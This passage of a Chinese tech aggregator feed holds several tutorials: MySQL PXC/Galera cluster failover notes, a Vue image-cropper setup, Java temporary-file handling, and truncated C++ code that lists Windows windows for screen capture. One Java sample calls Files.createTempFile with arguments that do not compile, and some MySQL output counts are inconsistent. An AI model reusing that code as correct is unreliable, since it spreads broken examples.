tcp      0      0 0.0.0.0:4567        0.0.0.0:*       LISTEN      2968/mysqld[root@mysql3 ~]# systemctl start mysql    //注意：启动的是mysql服务，不是mysqld
[root@mysql3 ~]# netstat -utnlp | grep :3306    //数据库服务端口
tcp6     0      0 :::3306             :::*            LISTEN      2968/mysqld
[root@mysql2 ~]# netstat -utnlp | grep :4567    //集群通信端口
tcp      0      0 0.0.0.0:4567        0.0.0.0:*       LISTEN      2968/mysqld
步骤4：测试配置
① 在任意数据库服务器查看集群信息
mysql&gt; show status like "%wsrep%";     //查找到以下信息
+----------------------------------+-------------------------------------------------------+
| Variable_name                    | Value                                                 |
+----------------------------------+-------------------------------------------------------+
| wsrep_incoming_addresses         | 192.168.2.11:3306,192.168.2.12:3306,192.168.2.13:3306 |
| wsrep_cluster_weight             | 3                                                     |
| wsrep_cluster_status             | Primary                                               |
| wsrep_connected                  | ON                                                    |
| wsrep_ready                      | ON                                                    |
+----------------------------------+-------------------------------------------------------+
71 rows in set (0.01 sec)
解释说明：
- wsrep_incoming_addresses：加入Galera集群的节点地址
- wsrep_cluster_weight：Galera集群的权重
- wsrep_cluster_status：Galera集群的状态
（PRIMARY：节点处于集群PC中，尝试从集群中选取donor进行数据同步）
- wsrep_connected：Galera集群连接状态
- wsrep_ready：Galera集群准备状态
② 在任意数据库服务器访问集群，并授予测试用户（授予的用户，会同步到集群的其它成员）
mysql&gt; grant all on db1.* to dbuser1@'%' identified by 'NSD2021@tedu.cn';
Query OK, 0 rows affected, 1 warning (0.48 sec)
mysql&gt; show grants for dbuser1;
+--------------------------------------------------+
| Grants for dbuser1@%                             |
+--------------------------------------------------+
| GRANT USAGE ON *.* TO 'dbuser1'@'%'              |
| GRANT ALL PRIVILEGES ON `db1`.* TO 'dbuser1'@'%' |
+--------------------------------------------------+
2 rows in set (0.00 sec)
③ 客户端192.168.2.5连接集群任意数据库服务器，创建库和表，并存取数据（mysql1）
[root@localhost ~]# mysql -udbuser1 -pNSD2021@tedu.cn -h192.168.2.11
mysql&gt; create database db1 default charset utf8mb4;
Query OK, 1 row affected (0.01 sec)
mysql&gt; create table db1.students(id int primary key auto_increment, name varchar(20));
Query OK, 0 rows affected (0.00 sec)
mysql&gt; insert into db1.students(name) values ('tom');
Query OK, 1 row affected (0.01 sec)
④ 客户端192.168.2.5连接集群任意数据库服务器查看数据（mysql2、mysql3）
[root@localhost ~]# mysql -udbuser1 -pNSD2021@tedu.cn -h192.168.2.12
mysql&gt; select * from db1.students;
+----+------+
| id | name |
+----+------+
|  1 | tom  |
+----+------+
1 row in set (0.00 sec)[root@localhost ~]# mysql -udbuser1 -pNSD2021@tedu.cn -h192.168.2.13
mysql&gt; select * from db1.students;
+----+------+
| id | name |
+----+------+
|  1 | tom  |
+----+------+
1 row in set (0.00 sec)
步骤5：测试故障自动恢复
补充：停止3台服务器的任意一台主机的数据库服务，都不会影响集群其它数据库服务器的数据存取
① 情况1：停止mysql@bootstrap.service服务
[root@mysql1 ~]# systemctl stop mysql@bootstrap.service
# 在任意数据库服务器，存储数据并查看
[root@mysql2 ~]# mysql -uroot -pNSD2021@tedu.cn
mysql&gt; insert into db1.students(name) values('jerry');
Query OK, 1 row affected (0.01 sec)
mysql&gt; select * from db1.students;
+----+-------+
| id | name  |
+----+-------+
|  1 | tom   |
|  5 | jerry |
+----+-------+
2 rows in set (0.00 sec)
补充：id字段设置了自动增长，所以在插入语句时，会按照自动增长的方式递增，但递增的顺序是根据集群拥有的服务器数量做参考，假设集群有2台服务器，则顺序可能为2、4、6...，有3台服务器，则顺序可能为3、6、9；原因为保证插入语句主键不会重复；（也可以指定字段插入，但不建议）
② 停止服务后，查看/var/lib/mysql/grastate.dat文件，与其它节点的seqno不一致
[root@mysql1 ~]# cat /var/lib/mysql/grastate.dat
# GALERA saved state
version: 2.1
uuid:    e74df6e9-ceb6-11eb-904b-d65cf985a2a7
seqno:   6
safe_to_bootstrap: 0[root@mysql2 ~]# cat /var/lib/mysql/grastate.dat
# GALERA saved state
version: 2.1
uuid:    e74df6e9-ceb6-11eb-904b-d65cf985a2a7
seqno:   -1
safe_to_bootstrap: 0[root@mysql3 ~]# cat /var/lib/mysql/grastate.dat
# GALERA saved state
version: 2.1
uuid:    e74df6e9-ceb6-11eb-904b-d65cf985a2a7
seqno:   -1
safe_to_bootstrap: 0
常见报错：
第一台数据库服务器暂停了初始化集群服务，虽不会影响集群其它数据库服务器的数据存取，但再次以该服务器重启初始化集群服务时，会提示报错
排错思路：
查看
/var/log/mysqld.log
提示报错：It may not be safe to bootstrap the cluster from this node. It was not the last one to leave the cluster and may not contain all the updates. To force cluster bootstrap with this node, edit the grastate.dat file manually and set safe_to_bootstrap to 1 .
原因分析：
从此节点引导群集可能不安全。它不是最后一个离开集群的，并且可能不包含所有更新。要强制此节点进行群集引导，请手动编辑grastate.dat文件，并将safe_To_bootstrap设置为1。
解决办法：
停止集群所有的数据库服务器，并在服务器上查看/var/lib/mysql/grastate.dat文件，找到具有最高seqno的节点（若有seqno相同，则选其一），并把safe_to_bootstrap的值改为1（默认情况下，最后离开集群的数据库服务器的seqno值可能最大）
③ 停止集群其它的mysql服务器
[root@mysql2 ~]# systemctl stop mysql
[root@mysql3 ~]# systemctl stop mysql     //最后一个退出关闭服务
④ 查看所有mysql服务器，找到具有最高seqno的节点，并设置safe_to_boostrap的值改为1
[root@mysql3 ~]# vim /var/lib/mysql/grastate.dat
# GALERA saved state
version: 2.1
uuid:    50caf19c-ce5d-11eb-bb5b-5229ff45a12e
seqno:   10
safe_to_bootstrap: 1   //群集引导
[root@mysql3 ~]# systemctl start mysql@bootstrap.service
⑤ 再启动其它主机的mysql服务
[root@mysql1 ~]# systemctl start mysql
[root@mysql2 ~]# systemctl start mysql
⑥ 再次检查所有数据库服务器的/var/lib/mysql/grastate.dat文件，发现所有seqno值都同步了；
[root@mysql1 ~]# vim /var/lib/mysql/grastate.dat
# GALERA saved state
version: 2.1
uuid:    50caf19c-ce5d-11eb-bb5b-5229ff45a12e
seqno:   -1
safe_to_bootstrap: 0
验证：查看故障恢复的数据库服务器数据，已自动恢复
[root@mysql1 ~]# mysql -uroot -pNSD2021@tedu.cn
mysql&gt; insert into db1.students(name) values('jerry');
Query OK, 1 row affected (0.01 sec)
mysql&gt; select * from db1.students;
+----+-------+
| id | name  |
+----+-------+
|  1 | tom   |
|  5 | jerry |
+----+-------+
2 rows in set (0.00 sec)
①  情况2：停止mysql服务
[root@mysql2 ~]# systemctl stop mysql
② 停止服务后，查看/var/lib/mysql/grastate.dat文件，与其它节点的seqno不一致
[root@mysql2 ~]# cat /var/lib/mysql/grastate.dat
# GALERA saved state
version: 2.1
uuid:    e74df6e9-ceb6-11eb-904b-d65cf985a2a7
seqno:   9
safe_to_bootstrap: 0[root@mysql1 ~]# cat /var/lib/mysql/grastate.dat
# GALERA saved state
version: 2.1
uuid:    e74df6e9-ceb6-11eb-904b-d65cf985a2a7
seqno:   -1
safe_to_bootstrap: 0
③ 在任意数据库服务器，存储数据并查看
[root@mysql1 ~]# mysql -uroot -pNSD2021@tedu.cn
mysql&gt; insert into db1.students(name) values('ben');
Query OK, 1 row affected (0.01 sec)
mysql&gt; select * from db1.students;
+----+-------+
| id | name  |
+----+-------+
|  1 | tom   |
|  5 | jerry |
|  7 | ben   |
+----+-------+
2 rows in set (0.00 sec)
④ 再次启动mysql服务
[root@mysql2 ~]# systemctl start mysql
⑤ 再次检查数据库服务器的/var/lib/mysql/grastate.dat文件，发现所有seqno值都同步了；
[root@mysql2 ~]# cat /var/lib/mysql/grastate.dat
# GALERA saved state
version: 2.1
uuid:    e74df6e9-ceb6-11eb-904b-d65cf985a2a7
seqno:   -1
safe_to_bootstrap: 0
验证：查看故障恢复的数据库服务器数据，已自动恢复
[root@mysql2 ~]# mysql -uroot -pNSD2021@tedu.cn
mysql&gt; insert into db1.students(name) values('ben');
Query OK, 1 row affected (0.01 sec)
mysql&gt; select * from db1.students;
+----+-------+
| id | name  |
+----+-------+
|  1 | tom   |
|  5 | jerry |
|  7 | ben   |
+----+-------+
2 rows in set (0.00 sec)
二、存储引擎
数据库存储引擎是数据库底层软件组织，数据库管理系统（DBMS）使用数据引擎进行创建、查询、更新和删除数据。不同的存储引擎提供不同的存储机制、索引技巧、锁定水平等功能，使用不同的存储引擎，还可以获得特定的功能。现在许多不同的数据库管理系统都支持多种不同的数据引擎。MySQL支持很多存储引擎，包括
MyISAM、InnoDB、BDB、MEMORY、MERGE、EXAMPLE、NDB Cluster、ARCHIVE
等，其中InnoDB和BDB支持事务安全。
例如：查看数据库默认使用并支持的引擎
mysql&gt; show engines;       //DEFAULT表示默认使用的引擎
+--------------------+---------+----------------------------------------------------------------------------+--------------+------+------------+
| Engine             | Support | Comment                                                                    | Transactions | XA   | Savepoints |
+--------------------+---------+----------------------------------------------------------------------------+--------------+------+------------+
| CSV                | YES     | CSV storage engine                                                         | NO           | NO   | NO         |
| PERFORMANCE_SCHEMA | YES     | Performance Schema                                                         | NO           | NO   | NO         |
| BLACKHOLE          | YES     | /dev/null storage engine (anything you write to it disappears)             | NO           | NO   | NO         |
| MyISAM             | YES     | MyISAM storage engine                                                      | NO           | NO   | NO         |
| InnoDB             | DEFAULT | Percona-XtraDB, Supports transactions, row-level locking, and foreign keys | YES          | YES  | YES        |
| ARCHIVE            | YES     | Archive storage engine                                                     | NO           | NO   | NO         |
| MRG_MYISAM         | YES     | Collection of identical MyISAM tables                                      | NO           | NO   | NO         |
| FEDERATED          | NO      | Federated MySQL storage engine                                             | NULL         | NULL | NULL       |
| MEMORY             | YES     | Hash based, stored in memory, useful for temporary tables                  | NO           | NO   | NO         |
+--------------------+---------+----------------------------------------------------------------------------+--------------+------+------------+
9 rows in set (0.00 sec)
例如：查看当前表使用的存储引擎
mysql&gt; show create table db1.students\G
*************************** 1. row ***************************Table: students
Create Table: CREATE TABLE `students` (`id` int(11) NOT NULL AUTO_INCREMENT,`name` varchar(20) DEFAULT NULL,PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=10 DEFAULT CHARSET=utf8mb4
1 row in set (0.00 sec)
例如：创建表时指定使用的存储引擎
mysql&gt; create table db1.students2(id int primary key auto_increment, name varchar(20)) engine=myisam;
Query OK, 0 rows affected (0.00 sec)
mysql&gt; show create table db1.students2;
+-----------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| Table     | Create Table                                                                                                                                                       |
+-----------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| students2 | CREATE TABLE `students2` (`id` int(11) NOT NULL AUTO_INCREMENT,`name` varchar(20) DEFAULT NULL,PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=utf8mb4 |
+-----------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.00 sec)
三、读锁与写锁，行锁与表锁
1、读锁和写锁
无论何时，只要有多个SQL需要同一时刻修改数据，都会产生并发控制的问题。解决这类经典问题的方法就是并发控制，即在处理并发读或者写时，可以通过实现一个由两种类型的锁组成的锁系统来解决问题。这两种锁就是共享锁和排他锁，也叫读锁和写锁。
读锁（共享锁）：
特性：读锁是共享的，多个用户可以在同一时刻读取同一资源，互不干扰。
作用：确保在读取数据时，数据不会被其他事务修改，从而保证数据的一致性。
写锁（排他锁）：
特性：写锁是排他的，一个写锁会阻塞其他所有的写锁和读锁。
作用：确保在写入数据时，只有一个用户能够执行写操作，防止其他用户读取或修改正在写入的同一资源，从而保证数据的一致性和完整性。
锁的优先级：
写锁的优先级通常高于读锁，以确保写操作的及时性和数据的一致性。
2、行锁和表锁
实际数据库系统中每时每刻都在发生锁定，锁也是有粒度的，提高共享资源并发行的方式就是让锁更有选择性，尽量只锁定需要修改的部分数据，而不是所有的资源，因此要进行精确的锁定。由于加锁也需要消耗资源，包括获得锁、检查锁是否解除、释放锁等，都会增加系统的开销；所谓的锁策略就是要在锁的开销和数据的安全性之间寻求平衡，这种平衡也会影响性能。每种MySQL存储引擎都有自己的锁策略和锁粒度，最常用的两种重要的锁策略分别是表锁和行锁。
表锁：
特性：表锁是开销最小的锁策略，它会锁定整张表。
作用：当用户对表进行写操作时，需要先获得写锁，这会阻塞其他用户对该表的所有读写操作。只有在没有写锁的情况下，其他读取的用户才能获得读锁，读锁之间是不相互阻塞的。
优点：速度快，开销小。
缺点：冲突多，并发性较低。
行锁：
特性：行锁只对指定的记录加锁，其他进程仍然可以对同一表中的其他记录进行操作。
作用：行锁可以最大程度地支持并发处理，但也带来了最大的锁开销。
优点：冲突少，并发性高。
缺点：速度慢，开销大。
3、锁策略的平衡
锁策略的选择需要在锁的开销和数据的安全性之间寻求平衡。不同的MySQL存储引擎有不同的锁策略和锁粒度，常见的两种重要锁策略是表锁和行锁。
表锁：适用于读操作频繁、写操作较少的场景，因为表锁的开销小，速度快，但并发性较低。
行锁：适用于写操作频繁、需要高并发的场景，因为行锁的冲突少，并发性高，但开销大，速度慢
四、常见存储引擎
MySQL支持多种存储引擎，每种存储引擎都有其独特的特性和适用场景。以下是三种常见的存储引擎：MyISAM、InnoDB和MEMORY。
1. MyISAM
默认存储引擎：
MySQL 5.5之前的默认存储引擎。
优势：
访问速度快。
适用场景：
对事务的完整性没有要求，或以select、insert为主的应用。在Web、数据仓库中应用广泛。
特点：
① 不支持事务、外键。
② 文件存储：每个MyISAM表在磁盘上存储为3个文件，文件名和表名相同，扩展名分别是：
.frm：存储表定义（表结构）。
.myd：MYData，存储数据。
.myi：MYIndex，存储索引。
[root@mysql1 ~]# ls /var/lib/mysql/db1/
db.opt  students2.frm  students2.MYD  students2.MYI
2.InnoDB
默认存储引擎：
MySQL 5.5之后的默认存储引擎。
适用场景：
对事务的完整性有较高要求，在并发条件下要求数据的一致性，数据操作中包含读、插入、删除、更新。在计费系统、财务系统等对数据的准确性要求较高的系统中被广泛应用。
优点：
提供了具有提交（Commit）、回滚（Rollback）、崩溃恢复能力的事务安全，支持外键。
缺点：
相比较于MyISAM，写的处理效率差一点，并且会占用更多的磁盘空间来存储数据和索引。
特点：
① 自动增长列：InnoDB表的自动增长列必须是索引，如果是组合索引，也必须是组合索引的第一列。MyISAM表的自动增长列可以是组合索引的其他列。
② 外键约束：MySQL的存储引擎中只有InnoDB支持外键约束。注意：当某个表被其它表创建了外键参照，那么该表对应的索引和主键禁止被删除。
3.MEMORY
存储方式：
用保存在内存中的数据来创建表，每个MEMORY表对应一个磁盘文件，格式是.frm。
适用场景：
内容变化不频繁的代码表，作为统计操作的中间结果表，便于利用它速率快的优势高效地对中间结果进行分析。
特点：
① 数据存储：数据存放在内存中，默认使用HASH索引，访问速度特别快。
② 缺点：数据库服务一旦关闭，数据就会丢失，另外对表的大小有限制。
扩展：MyISAM与InnoDB存储引擎的区别
事务支持：
InnoDB：支持事务。
MyISAM：不支持事务。
锁机制：
InnoDB：支持行级锁。
MyISAM：支持表级锁。
MVCC（多版本并发控制）：
InnoDB：支持MVCC。
MyISAM：不支持MVCC。
外键支持：
InnoDB：支持外键。
MyISAM：不支持外键。
全文索引：
InnoDB：不支持全文索引。
MyISAM：支持全文索引。
MyISAM：适用于读操作频繁、对事务要求不高的场景，访问速度快，但不支持事务和外键。
InnoDB：适用于对事务完整性有较高要求、需要高并发和数据一致性的场景，支持事务、外键和行级锁，但占用更多磁盘空间。
MEMORY：适用于数据变化不频繁、需要快速访问的场景，数据存储在内存中，访问速度极快，但数据易丢失且表大小有限制。
思维导图：
小结：
本篇章节为
【第四阶段】RDBMS2-DAY5
的学习笔记，这篇笔记可以初步了解到 PXC概述、部署PXC（自动故障恢复测试）、存储引擎、读锁/写锁、表锁/行锁、常用的存储引擎介绍，除此之外推荐参考相关学习网址：
带你玩转Mysql高可用方案--PXC_pxc架构图-CSDN博客
Tip：毕竟两个人的智慧大于一个人的智慧，如果你不理解本章节的内容或需要相关笔记、视频，可私信小安，请不要害羞和回避，可以向他人请教，花点时间直到你真正的理解。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540108.html</guid><pubDate>Fri, 31 Oct 2025 07:24:25 +0000</pubDate></item><item><title>Vue 上传图片前 裁剪图片</title><link>https://www.ppmy.cn/news/1540109.html</link><description>一. 使用的技术
vue-cropper
文档：vue-cropper | A simple picture clipping plugin for vue
二. 安装
npm install vue-cropper  或  yarn add vue-cropper
三. 引入
在使用页面中引用
import { VueCropper } from 'vue-cropper';
四. 使用
配置项：
五. 小结
这个可以结合element 上传组件使用 在上传图片选择之后 拿到文件的
url地址
,
base64
,
blob
赋值给vue-cropper. 弹出截图组件，截取完之后可以拿到图片的数据。然后在赋值给上传组件。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540109.html</guid><pubDate>Fri, 31 Oct 2025 07:24:28 +0000</pubDate></item><item><title>如何正确并优雅的使用Java中的临时文件目录</title><link>https://www.ppmy.cn/news/1540110.html</link><description>场景需求
在一些需要进行文件数据处理的开发场景中，我们可能会想到将文件存储在一个临时的目录中，当数据处理完成后，把临时文件删除即可。
下面就为大家介绍如何正确并优雅的使用Java中的临时文件目录
正文内容
其实在 Java SDK 中已经提供了相关的支持。
​
System.getProperty("java.io.tmpdir")
​ 是 Java 中的一个系统属性调用，它用于获取当前 Java 虚拟机所在的系统默认的临时文件目录。这个目录通常用于存放临时文件，比如在文件上传过程中生成的临时文件。
这个目录的路径通常是由操作系统决定的，并且可能因操作系统的不同而有所差异。例如：
在 Windows 系统上，通常是
C:\Users\用户名\AppData\Local\Temp
​。
在 Linux 或 macOS 系统上，通常是
/tmp
​。
这个属性可以被用来确定一个合适的位置来存放临时文件，比如在处理文件上传时生成的临时文件。使用这个属性可以确保你的应用程序在不同平台上的兼容性，因为不需要硬编码一个特定的路径。
例如，如果你需要在应用程序中创建一个临时文件，你可以这样做：
import
java
.
io
.
File
;
import
java
.
io
.
IOException
;
import
java
.
nio
.
file
.
Files
;
import
java
.
nio
.
file
.
Path
;
public
class
TempFileExample
{
public
static
void
main
(
String
[
]
args
)
{
try
{
// 获取系统默认的临时文件目录
String
tempDirPath
=
System
.
getProperty
(
"java.io.tmpdir"
)
;
// 在临时文件目录中创建一个临时文件
Path
tempFilePath
=
Files
.
createTempFile
(
tempDirPath
,
"prefix"
,
"suffix"
)
;
// 输出临时文件的路径
System
.
out
.
println
(
"Temporary file path: "
+
tempFilePath
)
;
// 使用临时文件后，记得删除它
// Files.delete(tempFilePath);
}
catch
(
IOException
e
)
{
e
.
printStackTrace
(
)
;
}
}
}
在这个例子中，
Files.createTempFile
​ 方法创建了一个临时文件，并且指定了前缀和后缀。这个方法会自动选择一个合适的文件名，并将文件创建在指定的目录中。记得在不再需要临时文件时删除它，以避免临时目录中积累过多的文件。
临时文件是否需要删除？
是否需要删除临时文件取决于你的应用程序的具体需求和设计。以下是一些考虑因素：
资源管理：临时文件通常占用磁盘空间，如果不及时清理，可能会累积过多，导致磁盘空间不足。因此，从资源管理的角度来看，删除不再需要的临时文件是一个好的实践。
安全性：如果临时文件包含敏感信息，那么在处理完毕后删除它们可以减少数据泄露的风险。
应用程序逻辑：在某些情况下，应用程序可能需要保留临时文件，直到某个特定的操作完成。在这种情况下，你可以在操作完成后删除文件。
系统资源：如果系统资源（如磁盘空间）非常有限，那么及时清理临时文件可以避免潜在的性能问题。
合规性：在某些行业，如医疗保健或金融行业，可能需要遵守特定的数据管理规定，这可能包括临时文件的处理和删除。
异常处理：在文件操作过程中可能会出现异常，如果程序在异常发生后继续运行，可能需要确保异常发生前创建的临时文件被删除，以防止临时文件的泄露。
如果你决定删除临时文件，应该在文件不再需要时尽快进行。例如，如果你在一个方法中创建了一个临时文件，那么在该方法的最后，或者在文件使用完毕后，应该删除它。这可以通过调用
Files.delete(Path path)
​ 方法来实现，其中
Path
​ 是指向临时文件的路径。
下面是一个简单的示例，展示如何在文件使用完毕后删除它：
import
java
.
io
.
IOException
;
import
java
.
nio
.
file
.
Files
;
import
java
.
nio
.
file
.
Path
;
import
java
.
nio
.
file
.
Paths
;
import
java
.
nio
.
file
.
StandardWatchEventKinds
;
import
java
.
nio
.
file
.
WatchEvent
;
import
java
.
nio
.
file
.
WatchKey
;
import
java
.
nio
.
file
.
WatchService
;
public
class
TempFileCleanup
{
public
static
void
main
(
String
[
]
args
)
{
try
{
// 创建临时文件
Path
tempFilePath
=
Files
.
createTempFile
(
"example"
,
".txt"
)
;
System
.
out
.
println
(
"Temporary file created: "
+
tempFilePath
)
;
// 使用临时文件进行操作
// ...（此处省略文件操作代码）
// 删除临时文件
Files
.
delete
(
tempFilePath
)
;
System
.
out
.
println
(
"Temporary file deleted: "
+
tempFilePath
)
;
}
catch
(
IOException
e
)
{
e
.
printStackTrace
(
)
;
}
}
}
在这个示例中，临时文件在创建后被使用，然后在不再需要时被删除。这样可以确保临时文件不会长时间占用磁盘空间。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540110.html</guid><pubDate>Fri, 31 Oct 2025 07:24:31 +0000</pubDate></item><item><title>FFMPEG录屏（18）--- 枚举Windows下的窗口列表并获取进程图标、标题、缩略图等</title><link>https://www.ppmy.cn/news/1540111.html</link><description>在Windows中获取可进行屏幕共享捕获的窗口列表及其图标、缩略图
在Windows系统中，获取可进行屏幕共享捕获的窗口列表以及它们的图标和缩略图是一个复杂但有趣的过程。本文将详细介绍如何实现这一功能，涉及到的主要技术包括Windows API、C++编程和一些第三方库。
前置知识
在开始之前，您需要了解以下内容：
Windows API
：Windows API提供了大量的函数，用于与操作系统进行交互。
C++编程
：本文的示例代码使用C++编写。
第三方库
：我们将使用
libyuv
库来处理图像缩放。
实现步骤
1. 包含必要的头文件
首先，我们需要包含一些必要的头文件，这些头文件提供了我们需要的函数和数据结构。
#
include
"base/devices/screen/desktop_geometry.h"
#
include
"base/devices/screen/enumerator.h"
#
include
"base/devices/screen/mouse_cursor.h"
#
include
"base/devices/screen/utils.h"
#
include
"base/devices/screen/win/capture_utils.h"
#
include
"base/devices/screen/win/cursor.h"
#
include
"base/devices/screen/win/scoped_object_gdi.h"
#
include
"base/log/logger.h"
#
include
"base/strings/string_trans.h"
#
include
"base/utils/win/version.h"
#
include
&lt;libyuv/scale_argb.h&gt;
#
include
&lt;memory&gt;
#
include
&lt;string&gt;
#
include
&lt;stdlib.h&gt;
#
include
&lt;shellapi.h&gt;
#
include
&lt;windows.h&gt;
2. 定义辅助函数
我们需要一些辅助函数来获取窗口属性、窗口文本、进程路径等。
获取窗口属性
typedef
HRESULT
(
WINAPI
*
FuncDwmGetWindowAttribute
)
(
HWND window
,
DWORD dwAttribute
,
PVOID pvAttribute
,
DWORD cbAttribute
)
;
FuncDwmGetWindowAttribute
helper_get_dwmapi_get_window_attribute
(
)
{
HINSTANCE dwmapi
=
LoadLibraryW
(
L
"Dwmapi.dll"
)
;
if
(
dwmapi
==
nullptr
)
{
return
nullptr
;
}
FuncDwmGetWindowAttribute dwmapi_get_window_attribute
=
(
FuncDwmGetWindowAttribute
)
GetProcAddress
(
dwmapi
,
"DwmGetWindowAttribute"
)
;
if
(
dwmapi_get_window_attribute
==
nullptr
)
{
return
nullptr
;
}
return
dwmapi_get_window_attribute
;
}
获取窗口文本
int
get_window_text_safe
(
HWND window
,
LPWSTR p_string
,
int
cch_max_count
)
{
return
::
InternalGetWindowText
(
window
,
p_string
,
cch_max_count
)
;
}
获取进程路径
int
get_window_process_path
(
HWND window
,
wchar_t
*
path
,
int
max_count
)
{
DWORD process_id
;
::
GetWindowThreadProcessId
(
window
,
&amp;
process_id
)
;
if
(
process_id
==
0
)
{
return
0
;
}
HANDLE process
=
::
OpenProcess
(
PROCESS_QUERY_LIMITED_INFORMATION
,
FALSE
,
process_id
)
;
if
(
process
==
nullptr
)
{
return
0
;
}
DWORD buffer_size
=
static_cast
&lt;
DWORD
&gt;
(
max_count
)
;
if
(
::
QueryFullProcessImageNameW
(
process
,
0
,
path
,
&amp;
buffer_size
)
==
0
)
{
::
CloseHandle
(
process
)
;
return
0
;
}
::
CloseHandle
(
process
)
;
return
buffer_size
;
}
3. 定义窗口枚举回调函数
我们需要一个回调函数来处理每个被枚举到的窗口。
BOOL WINAPI
enum_screen_source_info_proc
(
HWND window
,
LPARAM lParam
)
{
auto
*
param
=
reinterpret_cast
&lt;
enumerator_param
*
&gt;
(
lParam
)
;
if
(
!
::
IsWindowVisible
(
window
)
||
::
IsIconic
(
window
)
||
::
GetShellWindow
(
)
==
window
)
{
return
TRUE
;
}
if
(
::
GetAncestor
(
window
,
GA_ROOT
)
!=
window
)
{
return
TRUE
;
}
desktop_rect window_rect
=
desktop_rect
::
make_ltrb
(
0
,
0
,
0
,
0
)
;
if
(
!
get_window_rect
(
window
,
&amp;
window_rect
)
||
window_rect
.
is_empty
(
)
)
{
return
TRUE
;
}
if
(
is_window_invisible_win10_background_app
(
window
)
)
{
return
TRUE
;
}
HWND owner
=
::
GetWindow
(
window
,
GW_OWNER
)
;
LONG exstyle
=
::
GetWindowLongW
(
window
,
GWL_EXSTYLE
)
;
if
(
owner
&amp;&amp;
!
(
exstyle
&amp;
WS_EX_APPWINDOW
)
)
{
return
TRUE
;
}
if
(
(
exstyle
&amp;
WS_EX_TOOLWINDOW
)
&amp;&amp;
!
(
param
-&gt;
external_flags
&amp;
TRAA_SCREEN_SOURCE_FLAG_NOT_IGNORE_TOOLWINDOW
)
)
{
return
TRUE
;
}
if
(
!
capture_utils
::
is_window_response
(
window
)
&amp;&amp;
!
(
param
-&gt;
external_flags
&amp;
TRAA_SCREEN_SOURCE_FLAG_NOT_IGNORE_UNRESPONSIVE
)
)
{
return
TRUE
;
}
bool
owned_by_current_process
=
capture_utils
::
is_window_owned_by_current_process
(
window
)
;
if
(
(
param
-&gt;
external_flags
&amp;
TRAA_SCREEN_SOURCE_FLAG_IGNORE_CURRENT_PROCESS
)
&amp;&amp;
owned_by_current_process
)
{
return
TRUE
;
}
bool
has_title
=
false
;
WCHAR window_title
[
TRAA_MAX_DEVICE_NAME_LENGTH
]
=
L
""
;
if
(
get_window_text_safe
(
window
,
window_title
,
TRAA_MAX_DEVICE_NAME_LENGTH
-
1
)
&gt;
0
)
{
has_title
=
true
;
}
else
{
LOG_ERROR
(
"get window title failed: {}"
,
::
GetLastError
(
)
)
;
}
if
(
!
has_title
&amp;&amp;
!
(
param
-&gt;
external_flags
&amp;
TRAA_SCREEN_SOURCE_FLAG_NOT_IGNORE_UNTITLED
)
)
{
return
TRUE
;
}
bool
has_process_path
=
false
;
WCHAR process_path
[
TRAA_MAX_DEVICE_NAME_LENGTH
]
=
L
""
;
if
(
get_window_process_path
(
window
,
process_path
,
TRAA_MAX_DEVICE_NAME_LENGTH
-
1
)
&gt;
0
)
{
has_process_path
=
true
;
}
else
{
LOG_ERROR
(
"get window process path failed: {}"
,
::
GetLastError
(
)
)
;
}
if
(
(
param
-&gt;
external_flags
&amp;
TRAA_SCREEN_SOURCE_FLAG_IGNORE_NOPROCESS_PATH
)
&amp;&amp;
!
has_process_path
)
{
return
TRUE
;
}
WCHAR class_name
[
TRAA_MAX_DEVICE_NAME_LENGTH
]
=
L
""
;
const
int
class_name_length
=
::
GetClassNameW
(
window
,
class_name
,
TRAA_MAX_DEVICE_NAME_LENGTH
)
;
if
(
class_name_length
&lt;
1
)
return
TRUE
;
if
(
!
(
param
-&gt;
external_flags
&amp;
TRAA_SCREEN_SOURCE_FLAG_NOT_SKIP_SYSTEM_WINDOWS
)
)
{
if
(
wcscmp
(
class_name
,
L
"Progman"
)
==
0
||
wcscmp
(
class_name
,
L
"Program Manager"
)
==
0
)
return
TRUE
;
if
(
wcscmp
(
class_name
,
L
"TaskManagerWindow"
)
==
0
)
return
TRUE
;
if
(
wcscmp
(
class_name
,
L
"Button"
)
==
0
)
return
TRUE
;
if
(
wcscmp
(
class_name
,
L
"Windows.Internal.Shell.TabProxyWindow"
)
==
0
)
return
TRUE
;
}
traa_screen_source_info window_info
;
window_info
.
id
=
reinterpret_cast
&lt;
int64_t
&gt;
(
window
)
;
window_info
.
screen_id
=
get_window_owned_screen_id
(
window
)
;
window_info
.
is_window
=
true
;
window_info
.
is_minimized
=
::
IsIconic
(
window
)
;
if
(
is_window_maximized
(
window
,
&amp;
window_info
.
is_maximized
)
&amp;&amp;
window_info
.
is_maximized
)
{
get_window_maximized_rect
(
window
,
&amp;
window_rect
)
;
}
window_info
.
rect
=
window_rect
.
to_traa_rect
(
)
;
window_info
.
icon_size
=
param
-&gt;
icon_size
;
window_info
.
thumbnail_size
=
param
-&gt;
thumbnail_size
;
if
(
has_title
)
{
auto
utf8_title
=
string_trans
::
unicode_to_utf8
(
window_title
)
;
strncpy_s
(
const_cast
&lt;
char
*
&gt;
(
window_info
.
title
)
,
sizeof
(
window_info
.
title
)
-
1
,
utf8_title
.
c_str
(
)
,
utf8_title
.
length
(
)
)
;
}
if
(
has_process_path
)
{
auto
utf8_process_path
=
string_trans
::
unicode_to_utf8
(
process_path
)
;
strncpy_s
(
const_cast
&lt;
char
*
&gt;
(
window_info
.
process_path
)
,
sizeof
(
window_info
.
process_path
)
-
1
,
utf8_process_path
.
c_str
(
)
,
utf8_process_path
.
length
(
)
)
;
}
if
(
has_process_path
&amp;&amp;
param
-&gt;
icon_size
.
width
&gt;
0
&amp;&amp;
param
-&gt;
icon_size
.
height
&gt;
0
)
{
if
(
get_process_icon_data
(
process_path
,
desktop_size
(
param
-&gt;
icon_size
.
width
,
param
-&gt;
icon_size
.
height
)
,
const_cast
&lt;
uint8_t
*
*
&gt;
(
&amp;
window_info
.
icon_data
)
,
window_info
.
icon_size
)
)
{
}
else
{
LOG_ERROR
(
"get icon data failed"
)
;
}
}
if
(
param
-&gt;
thumbnail_size
.
width
&gt;
0
&amp;&amp;
param
-&gt;
thumbnail_size
.
